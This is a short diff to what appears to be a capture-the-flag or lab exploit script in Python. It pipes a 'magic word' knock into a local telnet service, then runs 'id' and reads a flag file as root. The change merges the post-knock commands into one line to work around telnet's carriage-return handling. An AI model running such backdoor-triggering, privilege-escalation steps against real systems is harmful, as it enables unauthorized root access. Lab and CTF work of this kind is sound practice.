@@ -90,7 +90,10 @@ def main():
         # flag materialises at boot, so retry the whole knock until it's the real one
         flag=""; uid0=False
         for attempt in range(12):
-            tn.sendline("( echo %s; sleep 2; echo id; echo 'cat %s/%s'; echo exit ) "
+            # knock with the magic word, then send the post-knock commands as ONE
+            # semicolon-separated line — telnet's CR handling mangles separate echo
+            # lines over the raw socket (id alone -> ": not found"), one line works.
+            tn.sendline("( echo %s; sleep 2; echo 'id; cat %s/%s' ) "
                         "| telnet localhost %s 2>&1" % (BMAGIC, LOOTD, LOOTN, BPORT))
             tn.expect(r"BRIAN> ",timeout=90)
             body=tn.before
